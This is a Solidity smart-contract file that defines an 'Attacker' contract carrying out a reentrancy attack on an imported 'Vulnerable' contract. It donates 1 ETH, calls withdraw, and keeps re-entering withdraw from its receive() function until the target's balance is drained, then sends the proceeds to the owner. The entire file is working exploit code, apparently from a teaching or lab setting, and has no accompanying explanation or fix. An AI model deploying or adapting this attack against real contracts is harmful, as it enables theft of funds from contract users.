// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vulnerable.sol";

contract Attacker {
    Vulnerable public vul;
    address public owner;

    event AttackTriggered(address indexed attacker);

    constructor(address _vulnerableAddress) {
        vul = Vulnerable(payable(_vulnerableAddress));
        owner = msg.sender;
    }

    // Fallback function that gets triggered during reentrancy
    receive() external payable {
        // Ensure that the balance is enough to call withdraw again
        if (address(vul).balance >= 1 ether) {
            vul.withdraw(1 ether);
        }
    }

    // This function starts the attack by donating and triggering the reentrancy
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        // Donate to ensure the contract has some funds
        vul.donate{value: 1 ether}();

        // Emit an event for debugging
        emit AttackTriggered(msg.sender);

        // Trigger the reentrancy attack by calling withdraw
        vul.withdraw(1 ether);
    }

    // Withdraw function to transfer balance to the attacker
    function withdraw() external {
        payable(owner).transfer(address(this).balance);
    }
}
